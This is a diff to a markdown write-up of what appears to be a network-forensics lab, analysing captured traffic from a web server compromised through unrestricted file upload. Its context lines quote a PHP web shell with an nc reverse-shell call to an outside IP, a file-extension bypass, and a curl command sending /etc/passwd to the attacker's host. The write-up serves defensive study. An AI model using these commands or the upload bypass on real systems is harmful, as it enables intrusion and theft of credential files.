@@ -22,12 +22,12 @@ Your task is to analyze the provided PCAP file to uncover how the file appeared 
 * **Step 2: Identifying the Attack Vector & Payload Delivery**
   * *Method:* Examined the HTTP POST method `http.request.method == POST` targeting the web server, follow the HTTP stream between the attacker and the server. Looks like an attacker found the `reviews/upload.php` page where the attacker can upload the php malicious webshell or specifically reverse shell or C2(spot via the content of the uploaded file (`nc` command) where it's `<?php system ..... nc 117.11.88.124 8080 >/tmp/f"); ?>`). The attacker attempts to upload a file named `image.php` via the `/reviews/upload.php` endpoint but was rejected by the server but later the attacker modifies the file name to `image.jpg.php` and successfully upload the file. Then to identify the directory where the uploaded file is stored at, Apply the filter `http.request.uri contains "image.jpg.php"` to analyze the packet's HTTP URI to locate the upload directory. Follow the HTTP stream and found `GET` request from the attacker to `/reviews/uploads` adn the server respond with `HTTP 200 OK` and the content inside contain the file.
   * *Finding:* The attacker exploited an Unrestricted File Upload vulnerability to deploy a reverse shell.
-  ![Apply HTTP POST method and follow the HTTP stream](Screenshots/WebStrike_1.png).
+  * ![Apply HTTP POST method and follow the HTTP stream](Screenshots/WebStrike_1.png)
 
 * **Step 3: Compromised Data**
   * *Method:* Since the attack is Control and Command/Reverse Shell, followed the TCP stream for the outbound traffic from the server. To analyze the downloaded files, apply the filter `tcp.dstport == 8080` to identify which file the attacker wanted to exfiltrate. Found the `curl` command used to transfer the data spefically `curl -X POST -d /etc/passwd http://117.11.88.124:443/` to his machine over HTTP port 443.
   * *Finding:* The attacker exfiltrated the contents of the server's `/etc/passwd` file.
-  ![Apply TCP destination port 8080 and follow the TCP stream](Screenshots/WebStrike_2.png).
+  * ![Apply TCP destination port 8080 and follow the TCP stream](Screenshots/WebStrike_2.png)
 
 ### 4. Indicators of Compromise (IoCs)
 * **Attacker IP Address(es) and Port:** `117.11.88.124` `8080`
